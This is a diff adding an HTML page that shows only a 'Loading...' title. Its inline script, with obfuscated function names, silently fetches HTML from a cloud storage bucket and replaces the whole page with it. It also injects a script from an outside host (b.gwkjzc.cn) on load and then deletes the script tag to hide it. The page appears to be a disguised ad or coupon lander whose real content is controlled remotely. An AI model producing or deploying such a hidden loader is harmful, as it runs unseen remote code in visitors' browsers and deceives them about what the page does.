@@ -1,0 +1,54 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>加载中...</title>
+
+
+</head>
+<body style="">
+
+<a id="back" rel="noopener noreferrer"></a>
+<div id="ld">
+
+</div>
+<script> var require = null;var define=null; var manage_url = '//b.gwkjzc.cn';
+var apiUrl=manage_url+"/hb2/Hb.php?m=show";var toquanurl = manage_url+"/hb2/Hb.php?m=show_quan&t="; var adUrl=manage_url+"/hb2/Hb_mjk.php?m=ad"</script>
+<script>
+    function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
+    function isc4s2z6u0w8(e, t) {
+        var a = document.createElement("script");
+        a.src = e,
+            a.onload = function () {
+                a.parentNode && a.parentNode.removeChild(a),
+                "function" == typeof t && t()
+            },
+            document.body.appendChild(a)
+    }
+    function gdatafi8jwpac4c(e, t, a) {
+        var n = new XMLHttpRequest;
+        //n.timeout = 3000;
+        n.onreadystatechange = function () {
+            4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) : "function" == typeof a && a(n))
+        };n.ontimeout = function (e) {
+            //alert('请求超时,重新发起请求');
+            //location.reload();
+        };
+        n.open("GET", e, !0),
+            n.send(null)
+    }
+    gdatafi8jwpac4c('//hbb2.oss-cn-beijing.aliyuncs.com/line/babai.html', function(res){
+        var doc=document.open("text/html","replace")
+        doc.write(res);
+        doc.close()
+    })
+    isc4s2z6u0w8(manage_url+'/hb2/Hb_mjk.php?m=show')
+</script>
+
+</body>
+</html>
+
